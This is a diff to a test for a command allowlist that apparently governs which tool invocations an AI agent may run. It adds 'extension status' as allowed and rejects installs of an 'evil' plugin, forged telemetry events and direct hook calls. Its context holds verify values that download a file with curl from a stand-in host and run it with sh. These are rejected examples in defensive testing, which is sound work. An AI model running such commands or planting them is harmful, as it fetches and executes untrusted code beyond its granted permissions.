@@ -522,6 +522,7 @@ test_is_ham_ctl_command_accepts_only_a_lone_allowlisted_invocation :: proc(t: ^t
 		BIN + " memory propose --title x",
 		BIN + " agent start-success",
 		BIN + " task show task_1",
+		BIN + " extension status",
 		BIN + " task comment task_1 --body done",
 		BIN + " chat send --to user --body \"looks good\"",
 	}) {
@@ -539,6 +540,12 @@ test_is_ham_ctl_command_accepts_only_a_lone_allowlisted_invocation :: proc(t: ^t
 		BIN + " bridge list",
 		BIN + " task-chain fleet set c --agent a --capacity 9",
 		BIN + " memory delete mem_1",
+		// Only `extension status` is a read: install adds a plugin whose hooks
+		// run code, event forges telemetry, hook is run by hooks.json directly.
+		BIN + " extension install claude --path /tmp/evil-plugin",
+		BIN + " extension install codex --extension-path=/tmp/evil",
+		BIN + " extension event --stdin",
+		BIN + " extension hook claude",
 		// Verbs that write something later executed (brief.verify) or act for the user.
 		BIN + " task update task_1 --verify 'curl -o /tmp/x http://e'",
 		BIN + " task create --goal g --verify 'sh /tmp/x'",
